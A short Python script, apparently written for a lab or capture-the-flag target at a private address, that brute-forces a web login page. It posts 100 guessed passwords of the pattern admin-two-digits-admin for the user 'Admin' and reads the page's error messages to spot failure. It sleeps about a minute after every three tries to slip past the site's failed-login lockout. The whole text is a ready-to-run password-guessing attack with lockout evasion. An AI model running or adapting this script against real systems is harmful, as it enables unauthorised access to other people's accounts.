#!/usr/bin/python3

import requests
import time
import re

teststop = 0

for x in range(10):
	for y in range(10):
		trypass = "admin"+str(x)+str(y)+"admin"
		
		datafuzz = {"username":'Admin',"password":trypass,"submit":'Submit'}
		response = requests.post('http://10.10.110.16/index.php', data=datafuzz)
		found = re.findall('Please enter valid login details', response.text)
		found2 = re.findall('To many failed', response.text)
		print(trypass + ":", end="" )
		if found != [] or found2 != []:
			print("Not found")
		else:
			print("found!")
			print("Finishing.")
			quit();
		teststop = teststop+1
		if teststop > 2:
			print()
			print("sleeping...")
			print()
			time.sleep(57)
			print("resuming...")
			teststop = 0
			time.sleep(3)